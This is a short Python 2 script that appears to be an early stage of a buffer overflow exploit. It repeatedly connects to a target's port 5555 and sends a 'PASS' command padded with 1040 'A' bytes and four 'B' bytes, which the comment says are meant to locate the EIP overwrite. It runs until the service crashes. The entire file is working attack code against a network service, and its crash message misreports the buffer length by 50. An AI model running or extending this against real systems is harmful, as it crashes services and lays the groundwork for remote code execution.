import sys, socket
from time import sleep
#locate the 4 caracter for the EIP 
target = sys.argv[1]
buff = 1040 * '\x41' + '\x42\x42\x42\x42'

while True:
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,5555))
    s.recv(1024)

    s.send("PASS " +buff)
    s.close()
    sleep(1)

   except:
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()
